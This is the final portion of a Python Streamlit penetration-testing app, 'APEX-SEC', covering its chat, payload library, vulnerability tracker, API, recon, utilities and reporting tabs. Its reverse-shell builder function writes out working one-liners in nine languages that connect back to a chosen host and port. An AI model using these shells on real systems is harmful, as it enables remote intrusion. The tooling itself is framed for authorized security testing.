                    if ev.get("extracted_text"):
                        with st.expander("Extracted text", expanded=False):
                            st.text(ev["extracted_text"][:2000])
                    if st.button("🗑️ Remove",
                                 key=f"rm_ev_{ev['evidence_id']}"):
                        EvidenceManager.safe_delete(ev["filepath"])
                        memory.delete_evidence(ev["evidence_id"])
                        st.rerun()

    # ---------------- Conversation history --------------------------------
    history = memory.get_messages(sid, include_errors=True)
    if not history:
        st.info(
            "No messages yet. Ask APEX-SEC to walk you through a target, "
            "analyze an error, or draft a finding."
        )

    for msg in history:
        role = msg["role"]
        with st.chat_message(role):
            st.markdown(msg["content"])
            ts = msg.get("created_at", "")[:19]
            if ts:
                st.caption(ts)

    # ---------------- Chat input ------------------------------------------
    placeholder = (
        "Describe the target, paste an error, or ask for next steps…"
    )
    user_input = st.chat_input(placeholder)
    if not user_input:
        return

    with st.chat_message("user"):
        st.markdown(user_input)

    with st.chat_message("assistant"):
        box = st.empty()
        with st.spinner("Analyzing…"):
            ok, response = orchestrator.process(sid, user_input, tracker)

        if ok:
            # Simulated streaming for smoother UX.
            buffer = ""
            for chunk in _chunk_text(response, 300):
                buffer += chunk
                box.markdown(buffer)
            box.markdown(response)
        else:
            box.error(response)

    st.rerun()


def _chunk_text(text: str, size: int) -> Iterable[str]:
    """Yield chunks of `size` characters, breaking on whitespace when possible."""
    if not text:
        return
    i = 0
    while i < len(text):
        end = min(i + size, len(text))
        if end < len(text):
            pivot = text.rfind(" ", i, end)
            if pivot > i + size // 2:
                end = pivot + 1
        yield text[i:end]
        i = end


# = END OF PART 5 =
# === PART 6 ===

"""
Remaining Streamlit tabs and the main application entry point.
"""


# ---------------------------------------------------------------------------
# Payload library tab
# ---------------------------------------------------------------------------

def render_payloads_tab() -> None:
    if not _STREAMLIT_AVAILABLE or st is None:
        return

    st.subheader("🧨 Payload Library")
    st.caption(
        f"{PayloadLibrary.count()} entries across "
        f"{len(PayloadLibrary.categories())} categories. "
        "Reference material — authorized lab use only."
    )

    # -------- Filters --------
    c1, c2, c3 = st.columns([2, 2, 2])
    with c1:
        cats = ["all"] + PayloadLibrary.categories()
        category = st.selectbox("Category", cats, key="pl_cat")
    with c2:
        meta_field = st.selectbox(
            "Metadata",
            ["any", "dbms", "engine", "provider", "lang", "context", "severity"],
            key="pl_meta_field",
        )
    with c3:
        keyword = st.text_input(
            "Search (name, payload, tags)",
            placeholder="e.g. waf-bypass mysql",
            key="pl_kw",
        )

    meta_value = ""
    if meta_field != "any":
        pool = PayloadLibrary.all_payloads()
        values = sorted({
            str(p.get(meta_field, "")).strip().lower()
            for p in pool
            if p.get(meta_field)
        })
        if values:
            meta_value = st.selectbox(
                f"Filter by {meta_field}",
                ["any"] + values,
                key="pl_meta_value",
            )

    # -------- Build result set --------
    if keyword.strip():
        results = PayloadLibrary.search(keyword)
    elif category != "all":
        results = [{**p, "category": category} for p in PayloadLibrary.get(category)]
    else:
        results = PayloadLibrary.all_payloads()

    if meta_field != "any" and meta_value and meta_value != "any":
        results = [
            p for p in results
            if str(p.get(meta_field, "")).strip().lower() == meta_value
        ]

    if not results:
        st.info("No payloads match the current filters.")
        return

    st.caption(f"Matching entries: {len(results)}")

    # -------- Render --------
    for i, p in enumerate(results):
        sev = p.get("severity", "medium")
        with st.expander(
            f"[{p['category'].upper()}] {p['name']} · {sev.upper()}"
        ):
            st.markdown(
                f"<span class='{_sev_class(sev)}'>Severity: {sev.upper()}</span>",
                unsafe_allow_html=True,
            )

            # Metadata chips
            chips = []
            for key in ("dbms", "engine", "provider", "lang", "context", "target"):
                v = p.get(key)
                if v:
                    chips.append(f"`{key}:{v}`")
            if chips:
                st.markdown(" ".join(chips))

            st.code(p.get("payload", ""), language="text")
            if p.get("notes"):
                st.caption(p["notes"])
            if p.get("tags"):
                st.caption("Tags: " + ", ".join(p["tags"]))

            st.download_button(
                "⬇️ Download payload",
                data=p.get("payload", ""),
                file_name=f"{p['category']}_{safe_name(p['name'])}.txt",
                mime="text/plain",
                key=f"dl_pl_{i}_{p['category']}_{safe_name(p['name'])}",
            )


# ---------------------------------------------------------------------------
# Vulnerabilities tab
# ---------------------------------------------------------------------------

def render_vulns_tab() -> None:
    if not _STREAMLIT_AVAILABLE or st is None:
        return

    tracker: VulnerabilityTracker = st.session_state.v_tracker
    memory: MemoryManager = st.session_state.memory
    sid: str = st.session_state.session_id

    st.subheader("🐞 Vulnerability Tracker")

    # -------- Add finding form --------
    with st.form("vuln_add_form", clear_on_submit=True):
        st.markdown("##### ➕ Add Finding")
        c1, c2 = st.columns(2)
        with c1:
            cve = st.text_input("CVE / Finding ID",
                                placeholder="CVE-2024-1234 or LAB-001")
            severity = st.selectbox(
                "Severity",
                ["Critical", "High", "Medium", "Low", "Info"],
            )
            cvss = st.number_input("CVSS score", 0.0, 10.0, 0.0, 0.1)
            title = st.text_input("Title",
                                  placeholder="SQLi in /api/login")
        with c2:
            cvss_vector = st.text_input("CVSS vector",
                                        placeholder="CVSS:3.1/AV:N/AC:L/...")
            tools = st.text_input("Tools used", placeholder="sqlmap, burp")
            refs = st.text_input("References", placeholder="url1, url2")

        desc = st.text_area("Description", height=70)
        impact = st.text_area("Impact", height=60)
        steps = st.text_area("Steps to reproduce (one per line)", height=80)
        mitigation = st.text_area("Remediation", height=80)

        submitted = st.form_submit_button("Add Finding")
        if submitted:
            if not cve.strip():
                st.error("CVE / Finding ID is required.")
            else:
                added = tracker.add(VulnerabilityEntry(
                    cve_id=cve.strip(),
                    severity=severity,
                    title=title.strip(),
                    description=desc.strip(),
                    mitigation=mitigation.strip(),
                    cvss_score=float(cvss),
                    cvss_vector=cvss_vector.strip(),
                    impact=impact.strip(),
                    references=[r.strip() for r in refs.split(",") if r.strip()],
                    tools_used=[t.strip() for t in tools.split(",") if t.strip()],
                    steps_to_reproduce=[s.strip() for s in steps.splitlines()
                                        if s.strip()],
                ))
                if added:
                    st.toast(f"Added {cve.strip()}.", icon="✅")
                    st.rerun()
                else:
                    st.warning("That finding ID is already tracked.")

    # -------- Summary --------
    st.markdown("---")
    if not tracker.findings:
        st.info("No findings recorded yet.")
    else:
        summary = tracker.summary()
        cols = st.columns(5)
        for col, sev in zip(cols, ["Critical", "High", "Medium", "Low", "Info"]):
            col.metric(sev, summary.get(sev, 0))

        st.markdown("---")
        evidence = memory.list_evidence(sid)

        for v in tracker.findings:
            linked = [e for e in evidence if e.get("linked_cve") == v.cve_id]
            with st.expander(
                f"**{v.cve_id}** · {v.title or 'Untitled'} · {v.severity}"
            ):
                c1, c2 = st.columns(2)
                with c1:
                    st.markdown(f"**Severity:** {v.severity}")
                    if v.cvss_score:
                        st.markdown(f"**CVSS:** {v.cvss_score} `{v.cvss_vector}`")
                    if v.tools_used:
                        st.markdown(f"**Tools:** {', '.join(v.tools_used)}")
                with c2:
                    if linked:
                        st.markdown(f"**Evidence:** {len(linked)} file(s)")
                    st.caption(f"Recorded: {v.timestamp[:19]}")

                if v.description:
                    st.markdown("**Description**")
                    st.markdown(v.description)
                if v.impact:
                    st.markdown("**Impact**")
                    st.markdown(v.impact)
                if v.steps_to_reproduce:
                    st.markdown("**Steps to reproduce**")
                    for i, step in enumerate(v.steps_to_reproduce, 1):
                        st.markdown(f"{i}. {step}")
                if v.mitigation:
                    st.markdown("**Remediation**")
                    st.markdown(v.mitigation)
                if v.references:
                    st.markdown("**References**")
                    for r in v.references:
                        st.markdown(f"- {r}")

                if st.button(f"🗑️ Remove {v.cve_id}",
                             key=f"rm_v_{v.cve_id}"):
                    tracker.remove(v.cve_id)
                    st.rerun()

    # -------- CISA cache search --------
    st.markdown("---")
    st.markdown("##### 📚 CISA KEV Cache")
    cache = load_threat_intel()
    if not cache:
        st.info("No CISA data cached. Use 'Sync CISA' in the sidebar.")
    else:
        q = st.text_input("Search cached entries", key="cisa_q")
        results = search_threat_intel(q, 30) if q.strip() else cache[:30]
        if not results:
            st.warning("No matches.")
        for item in results:
            st.markdown(
                f"**{item.get('cveID', 'N/A')}** — "
                f"{item.get('vulnerabilityName', 'Unknown')}"
            )
            st.caption(
                f"{item.get('vendorProject', '')} {item.get('product', '')} · "
                f"due {item.get('dueDate', 'n/a')}"
            )
            if item.get("shortDescription"):
                st.caption(item["shortDescription"][:240])
            st.markdown("---")


# ---------------------------------------------------------------------------
# API testing tab
# ---------------------------------------------------------------------------

def render_api_tab() -> None:
    if not _STREAMLIT_AVAILABLE or st is None:
        return

    st.subheader("🔌 API Testing")
    st.caption("Methodology checklists and request builders for authorized testing.")

    target_type = st.radio(
        "API type",
        ["REST", "GraphQL", "Authentication"],
        horizontal=True,
        key="api_kind",
    )

    if target_type == "REST":
        for line in APITester.rest_methodology():
            st.markdown(f"- {line}")
    elif target_type == "GraphQL":
        for line in APITester.graphql_methodology():
            st.markdown(f"- {line}")
    else:
        for line in APITester.auth_checklist():
            st.markdown(f"- {line}")

    st.markdown("---")
    st.markdown("##### 🧪 curl builder")

    c1, c2 = st.columns([1, 3])
    with c1:
        method = st.selectbox(
            "Method",
            ["GET", "POST", "PUT", "PATCH", "DELETE", "OPTIONS", "HEAD"],
            key="curl_method",
        )
    with c2:
        url = st.text_input("URL",
                            placeholder="https://api.target.tld/v1/users",
                            key="curl_url")

    headers_raw = st.text_area(
        "Headers (one per line: Key: Value)",
        value="Authorization: Bearer <token>\nContent-Type: application/json",
        height=90,
        key="curl_headers",
    )
    body = st.text_area("Body", height=100, key="curl_body")
    insecure = st.checkbox("Ignore TLS errors (-k)", key="curl_insecure")

    if url.strip():
        headers: Dict[str, str] = {}
        for line in headers_raw.splitlines():
            if ":" in line:
                k, v = line.split(":", 1)
                headers[k.strip()] = v.strip()
        cmd = APITester.generate_curl(
            method, url.strip(), headers, body or None, insecure,
        )
        st.code(cmd, language="bash")
        st.download_button(
            "⬇️ Download command",
            data=cmd,
            file_name="api_request.sh",
            mime="text/plain",
            key="dl_api_curl",
        )

    st.markdown("---")
    st.markdown("##### 📦 Common injection payloads")
    for cat, payloads in APITester.common_payloads().items():
        with st.expander(cat.replace("_", " ").title()):
            for p in payloads:
                st.code(p, language="text")


# ---------------------------------------------------------------------------
# IoT / recon tab
# ---------------------------------------------------------------------------

def render_recon_tab() -> None:
    if not _STREAMLIT_AVAILABLE or st is None:
        return

    tracker: VulnerabilityTracker = st.session_state.v_tracker

    st.subheader("📡 Reconnaissance")
    st.caption("Ready-to-run commands for authorized lab and field work.")

    c1, c2 = st.columns(2)
    with c1:
        target = st.text_input(
            "Target",
            value=tracker.target.ip_address or "192.168.1.1",
            key="recon_target",
        )
    with c2:
        subnet = st.text_input("Subnet", value="192.168.1.0/24",
                               key="recon_subnet")

    section = st.selectbox(
        "Category",
        ["Network Discovery", "Port Scanning", "Web Recon", "IoT / ICS"],
        key="recon_section",
    )

    if section == "Network Discovery":
        cmds = ReconHelper.network_discovery(subnet)
    elif section == "Port Scanning":
        cmds = ReconHelper.port_scanning(target)
    elif section == "Web Recon":
        url = target if target.startswith("http") else f"http://{target}"
        cmds = ReconHelper.web_recon(url)
    else:
        cmds = ReconHelper.iot_specific(target)

    for entry in cmds:
        with st.expander(f"**{entry['tool']}** — {entry['purpose']}"):
            st.code(entry["cmd"], language="bash")
            st.download_button(
                "⬇️ Download command",
                data=entry["cmd"],
                file_name=f"{safe_name(entry['tool'])}.sh",
                mime="text/plain",
                key=f"dl_recon_{entry['tool']}",
            )


# ---------------------------------------------------------------------------
# Tools tab
# ---------------------------------------------------------------------------

def render_tools_tab() -> None:
    if not _STREAMLIT_AVAILABLE or st is None:
        return

    config: ConfigManager = st.session_state.config_mgr
    tracker: VulnerabilityTracker = st.session_state.v_tracker

    st.subheader("🧰 Utilities")

    tool = st.selectbox(
        "Tool",
        [
            "Hash Generator",
            "Base64 Encode / Decode",
            "URL Encode / Decode",
            "JWT Decoder",
            "Reverse Shell Builder",
            "CVE Lookup (NVD)",
        ],
        key="tool_select",
    )

    # -------- Hash --------
    if tool == "Hash Generator":
        text = st.text_area("Input", height=80, key="hash_in")
        algo = st.selectbox("Algorithm",
                            ["md5", "sha1", "sha256", "sha512"],
                            key="hash_algo")
        if text:
            try:
                digest = hashlib.new(algo, text.encode("utf-8")).hexdigest()
                st.code(digest, language="text")
            except ValueError as exc:
                st.error(f"Unsupported algorithm: {exc}")

    # -------- Base64 --------
    elif tool == "Base64 Encode / Decode":
        text = st.text_area("Input", height=80, key="b64_in")
        mode = st.radio("Mode", ["Encode", "Decode"], horizontal=True,
                        key="b64_mode")
        if text:
            try:
                if mode == "Encode":
                    out = base64.b64encode(text.encode("utf-8")).decode("ascii")
                else:
                    out = base64.b64decode(text.encode("ascii")).decode(
                        "utf-8", errors="replace"
                    )
                st.code(out, language="text")
            except Exception as exc:
                st.error(f"Failed: {exc}")

    # -------- URL --------
    elif tool == "URL Encode / Decode":
        text = st.text_area("Input", height=80, key="url_in")
        mode = st.radio("Mode", ["Encode", "Decode"], horizontal=True,
                        key="url_mode")
        if text:
            try:
                st.code(quote(text) if mode == "Encode" else unquote(text),
                        language="text")
            except Exception as exc:
                st.error(f"Failed: {exc}")

    # -------- JWT --------
    elif tool == "JWT Decoder":
        token = st.text_area("JWT", height=80, key="jwt_in")
        if token:
            parts = token.strip().split(".")
            if len(parts) < 2:
                st.error("Not a valid JWT (expected at least two segments).")
            else:
                def _pad(s: str) -> str:
                    return s + "=" * (-len(s) % 4)

                try:
                    header = json.loads(
                        base64.urlsafe_b64decode(_pad(parts[0])).decode("utf-8")
                    )
                    payload = json.loads(
                        base64.urlsafe_b64decode(_pad(parts[1])).decode("utf-8")
                    )
                    st.markdown("**Header**")
                    st.json(header)
                    st.markdown("**Payload**")
                    st.json(payload)
                    st.markdown("**Signature**")
                    st.code(parts[2] if len(parts) > 2 else "(none)")
                except Exception as exc:
                    st.error(f"Decode failed: {exc}")

    # -------- Reverse shell --------
    elif tool == "Reverse Shell Builder":
        if not tracker.has_authorization():
            st.warning(
                "Set an Authorization Reference in the Target Profile "
                "before using this tool."
            )
            return

        c1, c2 = st.columns(2)
        with c1:
            lhost = st.text_input("LHOST", value="10.0.0.1", key="rs_lhost")
        with c2:
            lport = st.text_input("LPORT", value="4444", key="rs_lport")

        shell_type = st.selectbox(
            "Shell",
            ["bash", "sh", "python3", "nc", "ncat", "powershell",
             "php", "perl", "ruby"],
            key="rs_kind",
        )

        if lhost and lport:
            payload = _build_reverse_shell(shell_type, lhost, lport)
            st.code(payload, language="bash")
            st.download_button(
                "⬇️ Download payload",
                data=payload,
                file_name=f"revshell_{shell_type}.txt",
                mime="text/plain",
                key="dl_rs",
            )
            st.caption("Reminder: authorized engagements only.")

    # -------- NVD --------
    elif tool == "CVE Lookup (NVD)":
        cve_input = st.text_input("CVE ID",
                                  placeholder="CVE-2024-1234",
                                  key="nvd_cve")
        if st.button("🔎 Look up", key="btn_nvd"):
            if not cve_input.strip():
                st.warning("Enter a CVE ID.")
            else:
                with st.spinner("Querying NVD…"):
                    data = fetch_nvd_cve(cve_input.strip())
                if data:
                    st.success(f"Found {data['cve_id']}")
                    st.json(data)
                    st.download_button(
                        "⬇️ Download JSON",
                        data=json.dumps(data, indent=4),
                        file_name=f"{data['cve_id']}.json",
                        mime="application/json",
                        key="dl_nvd",
                    )
                else:
                    st.error("Not found, or NVD request failed.")


def _build_reverse_shell(kind: str, lhost: str, lport: str) -> str:
    """Return a reverse shell one-liner for the requested interpreter."""
    if kind == "bash":
        return f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
    if kind == "sh":
        return (
            f"sh -i >& /dev/tcp/{lhost}/{lport} 0>&1"
        )
    if kind == "python3":
        return (
            f"python3 -c 'import socket,subprocess,os;"
            f"s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
            f"s.connect((\"{lhost}\",{lport}));"
            f"os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);"
            f"os.dup2(s.fileno(),2);"
            f"subprocess.call([\"/bin/sh\",\"-i\"])'"
        )
    if kind == "nc":
        return f"nc -e /bin/sh {lhost} {lport}"
    if kind == "ncat":
        return f"ncat {lhost} {lport} -e /bin/sh"
    if kind == "powershell":
        return (
            f"powershell -NoP -NonI -W Hidden -Exec Bypass -Command "
            f"$c=New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});"
            f"$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};"
            f"while(($i=$s.Read($b,0,$b.Length)) -ne 0){{"
            f"$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);"
            f"$sb=(iex $d 2>&1|Out-String);"
            f"$sb2=$sb+'PS '+(pwd).Path+'> ';"
            f"$sbt=([text.encoding]::ASCII).GetBytes($sb2);"
            f"$s.Write($sbt,0,$sbt.Length);$s.Flush()}}"
        )
    if kind == "php":
        return (
            f"php -r '$sock=fsockopen(\"{lhost}\",{lport});"
            f"exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
        )
    if kind == "perl":
        return (
            f"perl -e 'use Socket;$i=\"{lhost}\";$p={lport};"
            f"socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
            f"if(connect(S,sockaddr_in($p,inet_aton($i)))){{"
            f"open(STDIN,\">&S\");open(STDOUT,\">&S\");"
            f"open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'"
        )
    if kind == "ruby":
        return (
            f"ruby -rsocket -e 'exit if fork;"
            f"c=TCPSocket.new(\"{lhost}\",\"{lport}\");"
            f"while(cmd=c.gets);IO.popen(cmd,\"r\"){{|io|"
            f"c.print io.read}}end'"
        )
    return f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"


# ---------------------------------------------------------------------------
# Reports tab
# ---------------------------------------------------------------------------

def render_reports_tab() -> None:
    if not _STREAMLIT_AVAILABLE or st is None:
        return

    config: ConfigManager = st.session_state.config_mgr
    tracker: VulnerabilityTracker = st.session_state.v_tracker
    memory: MemoryManager = st.session_state.memory
    sid: str = st.session_state.session_id

    st.subheader("📄 Reports")
    st.caption("Export engagement findings in Markdown, HTML, and JSON.")

    c1, c2 = st.columns(2)
    with c1:
        author = st.text_input("Author",
                               value=str(config.get("report_author")),
                               key="rep_author")
    with c2:
        org = st.text_input("Organization",
                            value=str(config.get("report_org")),
                            key="rep_org")

    if st.button("💾 Save Author Info", key="btn_save_author"):
        config.update({"report_author": author, "report_org": org})
        st.toast("Author info saved.", icon="✅")

    st.markdown("---")
    summary = tracker.summary()
    cols = st.columns(5)
    for col, sev in zip(cols, ["Critical", "High", "Medium", "Low", "Info"]):
        col.metric(sev, summary.get(sev, 0))

    if not tracker.findings:
        st.warning("No findings tracked yet — report will be mostly empty.")

    evidence = memory.list_evidence(sid)

    md = ReportGenerator.to_markdown(tracker, evidence, sid, author, org)
    html = ReportGenerator.to_html(md, title=f"APEX-SEC Report {sid[:8]}")
    js = ReportGenerator.to_json(tracker, evidence, sid)

    stamp = datetime.now().strftime("%Y%m%d_%H%M%S")

    tab_md, tab_html, tab_json = st.tabs(["Markdown", "HTML", "JSON"])

    with tab_md:
        st.markdown(md)
        st.download_button(
            "⬇️ Download Markdown",
            data=md,
            file_name=f"apex_report_{stamp}.md",
            mime="text/markdown",
            key="dl_rep_md",
        )

    with tab_html:
        try:
            st.components.v1.html(html, height=640, scrolling=True)
        except Exception:
            st.text_area("HTML preview unavailable", html, height=400)
        st.download_button(
            "⬇️ Download HTML",
            data=html,
            file_name=f"apex_report_{stamp}.html",
            mime="text/html",
            key="dl_rep_html",
        )

    with tab_json:
        try:
            st.json(json.loads(js))
        except json.JSONDecodeError:
            st.code(js, language="json")
        st.download_button(
            "⬇️ Download JSON",
            data=js,
            file_name=f"apex_report_{stamp}.json",
            mime="application/json",
            key="dl_rep_json",
        )

    st.markdown("---")
    if st.button("💾 Save All Formats to disk", key="btn_save_reports"):
        written = ReportGenerator.save_all(md, html, js)
        if written:
            st.success(f"Wrote {len(written)} file(s) to {REPORTS_DIR}")
        else:
            st.error("Save failed. Check the logs.")


# ---------------------------------------------------------------------------
# Footer
# ---------------------------------------------------------------------------

def render_footer() -> None:
    if not _STREAMLIT_AVAILABLE or st is None:
        return

    config: ConfigManager = st.session_state.config_mgr
    sid: str = st.session_state.session_id

    st.markdown("---")
    c1, c2, c3, c4 = st.columns(4)
    c1.caption(f"🛡️ {APP_NAME} v{APP_VERSION}")
    c2.caption(f"💬 Session {sid[:8]}")
    c3.caption(f"🧠 {config.get('model')}")
    c4.caption(f"🕒 {datetime.now().strftime('%Y-%m-%d %H:%M')}")

    st.caption(
        "⚠️ Authorized security testing only. Obtain written permission "
        "before testing any system you do not own."
    )


# ---------------------------------------------------------------------------
# Main application entry
# ---------------------------------------------------------------------------

def main() -> None:
    """
    Streamlit entry point. Called when the module is run via
    `streamlit run apex_sec.py`. Guarded so importing the module
    for tests or the CLI does nothing here.
    """
    if not _STREAMLIT_AVAILABLE or st is None:
        raise SystemExit(
            "Streamlit is not installed. Run: pip install streamlit"
        )

    configure_page()
    inject_theme()
    bootstrap_session_state()
    render_header()
    render_sidebar()

    tabs = st.tabs([
        "💬 Chat",
        "🧨 Payloads",
        "🐞 Vulnerabilities",
        "🔌 API",
        "📡 Recon",
        "🧰 Tools",
        "📄 Reports",
    ])

    with tabs[0]:
        render_chat_tab()
    with tabs[1]:
        render_payloads_tab()
    with tabs[2]:
        render_vulns_tab()
    with tabs[3]:
        render_api_tab()
    with tabs[4]:
        render_recon_tab()
    with tabs[5]:
        render_tools_tab()
    with tabs[6]:
        render_reports_tab()

    render_footer()


# Streamlit executes this file top to bottom. When launched with
# `streamlit run apex_sec.py`, __name__ is set to "__main__", so the
# UI boots. When imported (tests, CLI), nothing runs.
if __name__ == "__main__":
    if _STREAMLIT_AVAILABLE:
        # Streamlit runtime detection: the CLI self-test path takes over
        # when the file is executed directly with `python apex_sec.py`.
        if "streamlit" in sys.modules and hasattr(st, "runtime"):
            try:
                from streamlit.runtime import exists as _st_runtime_exists
                if _st_runtime_exists():
                    main()
                else:
                    raise SystemExit(_cli_self_test())
            except ImportError:
                raise SystemExit(_cli_self_test())
        else:
            raise SystemExit(_cli_self_test())
    else:
        raise SystemExit(_cli_self_test())


#  END OF PART 6 
# == END OF FILE ==
